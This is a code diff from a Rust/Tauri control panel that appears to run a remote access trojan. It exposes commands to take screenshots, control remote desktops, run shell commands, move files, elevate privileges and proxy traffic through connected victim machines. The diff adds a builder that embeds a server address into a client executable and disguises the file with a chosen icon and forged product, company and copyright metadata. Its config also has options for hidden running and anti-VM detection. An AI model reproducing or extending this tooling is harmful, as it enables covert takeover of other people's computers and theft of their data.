@@ -1,8 +1,10 @@
-use tauri::State;
-use crate::handlers::{ SharedTauriState, FrontClient };
+use tauri::{State, Manager};
+use crate::handlers::{ SharedTauriState, FrontClient, AssemblyInfo };
 use crate::server::Log;
 use serde::Serialize;
 use std::vec;
+use std::fs;
+use base64::{engine::general_purpose, Engine as _};
 
 use tokio::net::TcpListener;
 use tokio::sync::mpsc;
@@ -20,17 +22,28 @@ use once_cell::sync::OnceCell;
 
 use common::packets::{RemoteDesktopConfig, MouseClickData, VisitWebsiteData, MessageBoxData, Process, FileData};
 
-pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>) -> Result<Sender<ServerCommand>, String> {
+use object::{ Object, ObjectSection };
+use std::fs::{ File as FsFile };
+use std::io::Write;
+use rmp_serde::Serializer;
+use std::process::Command;
+
+
+pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<Sender<ServerCommand>, String> {
     let channel_tx = {
         let tauri_state = tauri_state.0.lock().unwrap();
         
         if !tauri_state.running {
+            let log = Log { event_type: "server_stopped".to_string(), message: "Server not running!".to_string() };
+            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err("Server not running".to_string());
         }
         
         if let Some(tx) = tauri_state.channel_tx.get() {
             tx.clone()
         } else {
+            let log = Log { event_type: "server_stopped".to_string(), message: "Server channel not initialized!".to_string() };
+            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err("Server channel not initialized".to_string());
         }
     };
@@ -112,23 +125,9 @@ pub async fn start_server(
 
 
 #[tauri::command]
-pub async fn stop_server(tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
+pub async fn stop_server(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
     { 
-        let channel_tx = {
-            let mut tauri_state = tauri_state.0.lock().unwrap();
-            
-            if !tauri_state.running {
-                return Ok("false".to_string());
-            }
-            
-            tauri_state.running = false;
-
-            if let Some(tx) = tauri_state.channel_tx.get() {
-                tx.clone()
-            } else {
-                return Err("Server channel not initialized".to_string());
-            }
-        };
+        let channel_tx = get_channel_tx(tauri_state.clone(), app_handle).await?;
         
         channel_tx.send(ServerCommand::CloseClientSessions())
             .await
@@ -178,46 +177,124 @@ pub async fn build_client(
     mutex_enabled: bool,
     mutex: &str,
     unattended_mode: bool,
-    tauri_state: State<'_, SharedTauriState>
+    assembly_info: AssemblyInfo,
+    enable_icon: bool,
+    icon_path: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
+    let log = Log { event_type: "build_client".to_string(), message: "Building client...".to_string() };
+    let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+
+    let bin_data = fs::read("target/debug/client.exe").unwrap();
+    let file = object::File::parse(&*bin_data).unwrap();
+
+    let mut output_data = bin_data.clone();
+
+    let config = common::ClientConfig {
+        ip: ip.to_string(),
+        port: port.to_string(),
+        mutex_enabled,
+        mutex: mutex.to_string(),
+        unattended_mode,
+        group: "Default".to_string(),
+        install: false,
+        file_name: "".to_string(),
+        install_folder: "".to_string(),
+        enable_hidden: false,
+        anti_vm_detection: false,
     };
 
-    channel_tx.send(ServerCommand::BuildClient(ip.to_string(), port.to_string(), mutex_enabled, mutex.to_string(), unattended_mode))
-        .await
-        .map_err(|e| format!("Failed to send BuildClient command: {}", e))?;
+    let mut buffer: Vec<u8> = Vec::new();
+
+    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();
+
+    let mut new_data = vec![0u8; 1024];
+
+    for (i, byte) in buffer.iter().enumerate() {
+        new_data[i] = *byte;
+    }
+
+    if let Some(section) = file.section_by_name(".zzz") {
+        let offset = section.file_range().unwrap().0 as usize;
+        let size = section.size() as usize;
+
+        output_data[offset..offset + size].copy_from_slice(&new_data);
+    }
+
+    let mut file = FsFile::create("target/debug/Client_built.exe").unwrap();
+    let _ = file.write_all(&output_data);
+    drop(file);
+
+
+    let mut written_file_path: String = "target/debug/Client_built.exe".to_string();
+
+    let mut cmd = Command::new("target/rcedit.exe");
+
+    cmd.arg("target/debug/Client_built.exe");
+
+    if enable_icon && icon_path != "" {
+        cmd.arg("--set-icon").arg(icon_path);
+    }
+
+    if assembly_info.assembly_name != "" {
+        cmd.arg("--set-version-string").arg("ProductName").arg(&assembly_info.assembly_name);
+    }
+
+    if assembly_info.assembly_description != "" {
+        cmd.arg("--set-version-string").arg("FileDescription").arg(&assembly_info.assembly_description);
+    }
+
+    if assembly_info.assembly_company != "" {
+        cmd.arg("--set-version-string").arg("CompanyName").arg(&assembly_info.assembly_company);
+    }
+    
+    if assembly_info.assembly_copyright != "" {
+        cmd.arg("--set-version-string").arg("LegalCopyright").arg(&assembly_info.assembly_copyright);
+    }
+
+    if assembly_info.assembly_trademarks != "" {
+        cmd.arg("--set-version-string").arg("LegalTrademarks").arg(&assembly_info.assembly_trademarks);
+    }
+
+    if assembly_info.assembly_original_filename != "" {
+        cmd.arg("--set-version-string").arg("OriginalFilename").arg(&assembly_info.assembly_original_filename);
+    }
+
+    if assembly_info.assembly_file_version != "" {
+        cmd.arg("--set-file-version").arg(&assembly_info.assembly_file_version);
+    }
+
+    let status = cmd.status().unwrap();
+
+    if !status.success() {
+        let log = Log { event_type: "build_failed".to_string(), message: "Failed to build client.".to_string() };
+        let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+    }
+    
+    let log = Log { event_type: "build_finished".to_string(), message: "Client built successfully.".to_string() };
+    let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+
+    let written_file_path = std::fs::canonicalize("target/debug/Client_built.exe")
+    .map_err(|e| format!("Failed to get full path: {}", e))?
+    .to_string_lossy()
+    .replace(r"\\?\", "");
+
+    let _ = Command::new("explorer")
+    .arg("/select,")
+    .arg(&written_file_path)
+    .status()
+    .map_err(|e| println!("Failed to open explorer: {}", e));
 
     Ok("Client built".to_string())
 }
 
 #[tauri::command]
 pub async fn fetch_clients(
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<Vec<FrontClient>, String> {
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Ok(vec![]);
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     let (tx, rx) = tokio::sync::oneshot::channel();
     
@@ -234,24 +311,13 @@ pub async fn fetch_clients(
 #[tauri::command]
 pub async fn fetch_client(
     addr: String, 
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<FrontClient, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
-    
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
     
     let (tx, rx) = tokio::sync::oneshot::channel();
     
@@ -270,24 +336,13 @@ pub async fn fetch_client(
 pub async fn take_screenshot(
     addr: String, 
     display: i32, 
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
-    
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
     
     channel_tx.send(ServerCommand::TakeScreenshot(socket_addr, display.to_string()))
         .await
@@ -297,23 +352,11 @@ pub async fn take_screenshot(
 }
 
 #[tauri::command]
-pub async fn manage_client(addr: String, run: &str, tauri_state: State<'_, SharedTauriState>) -> Result<(), String> {
+pub async fn manage_client(addr: String, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<(), String> {
     let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
-    
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    .map_err(|e| format!("Invalid socket address: {}", e))?;
+
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     match run {
         "disconnect" => {
@@ -338,24 +381,13 @@ pub async fn start_remote_desktop(
     display: i32, 
     quality: u8, 
     fps: u8, 
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
+    .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::StartRemoteDesktop(socket_addr, RemoteDesktopConfig {
         display,
@@ -371,24 +403,13 @@ pub async fn start_remote_desktop(
 #[tauri::command]
 pub async fn stop_remote_desktop(
     addr: &str, 
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
     .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::StopRemoteDesktop(socket_addr))
         .await
@@ -404,24 +425,13 @@ pub async fn send_mouse_click(
     x: i32,
     y: i32,
     click_type: i32,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
     .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::MouseClick(socket_addr, MouseClickData {
         display,
@@ -439,24 +449,13 @@ pub async fn send_mouse_click(
 pub async fn visit_website(
     addr: &str,
     url: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
+    .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::VisitWebsite(socket_addr, VisitWebsiteData {
         visit_type: "normal".to_string(),
@@ -506,24 +505,13 @@ pub async fn send_messagebox(
     message: &str,
     button: &str,
     icon: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
-        .map_err(|e| format!("Invalid socket address: {}", e))?;
+    .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::ShowMessageBox(socket_addr, MessageBoxData {
         title: title.to_string(),
@@ -540,24 +528,13 @@ pub async fn send_messagebox(
 #[tauri::command]
 pub async fn elevate_client(
     addr: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::ElevateClient(socket_addr))
         .await
@@ -570,24 +547,13 @@ pub async fn elevate_client(
 pub async fn handle_system_command(
     addr: &str,
     run: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = {
-        let tauri_state = tauri_state.0.lock().unwrap();
-        
-        if !tauri_state.running {
-            return Err("Server not running".to_string());
-        }
-        
-        if let Some(tx) = tauri_state.channel_tx.get() {
-            tx.clone()
-        } else {
-            return Err("Server channel not initialized".to_string());
-        }
-    };
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::ManageSystem(socket_addr, run.to_string()))
         .await
@@ -599,12 +565,13 @@ pub async fn handle_system_command(
 #[tauri::command]
 pub async fn process_list(
     addr: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::GetProcessList(socket_addr))
         .await
@@ -618,12 +585,13 @@ pub async fn kill_process(
     addr: &str,
     pid: i32,
     name: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::KillProcess(socket_addr, Process {
         pid: pid as usize,
@@ -636,11 +604,11 @@ pub async fn kill_process(
 }
 
 #[tauri::command]
-pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
+pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
     
     match run {
         "start" => {
@@ -660,11 +628,11 @@ pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTa
 }
 
 #[tauri::command]
-pub async fn execute_shell_command(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
+pub async fn execute_shell_command(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::ShellCommand(socket_addr, run.to_string()))
         .await
@@ -678,12 +646,13 @@ pub async fn read_files(
     addr: &str,
     run: &str,
     path: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     match run {
         "previous_dir" => {
@@ -713,12 +682,13 @@ pub async fn manage_file(
     addr: &str,
     run: &str,
     file: &str,
-    tauri_state: State<'_, SharedTauriState>
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
 ) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     match run {
         "download_file" => {
@@ -743,11 +713,11 @@ pub async fn manage_file(
 }
     
 #[tauri::command]
-pub async fn start_reverse_proxy(addr: &str, port: &str, localport: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
+pub async fn start_reverse_proxy(addr: &str, port: &str, localport: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::StartReverseProxy(socket_addr, port.to_string(), localport.to_string()))
         .await
@@ -757,11 +727,11 @@ pub async fn start_reverse_proxy(addr: &str, port: &str, localport: &str, tauri_
 }
 
 #[tauri::command]
-pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
+pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
     let socket_addr = addr.parse()
         .map_err(|e| format!("Invalid socket address: {}", e))?;
 
-    let channel_tx = get_channel_tx(tauri_state).await?;
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
     channel_tx.send(ServerCommand::StopReverseProxy(socket_addr))
         .await
@@ -769,3 +739,14 @@ pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriSt
 
     Ok("Reverse proxy stopped".to_string())
 }
+
+#[tauri::command]
+pub async fn read_icon(path: &str, app_handle: AppHandle) -> Result<String, String> {
+    let icon = fs::read(path)
+        .map_err(|e| format!("Failed to read icon: {}", e))?;
+
+    let base64_icon = general_purpose::STANDARD.encode(&icon);
+
+    Ok(base64_icon)
+}
+
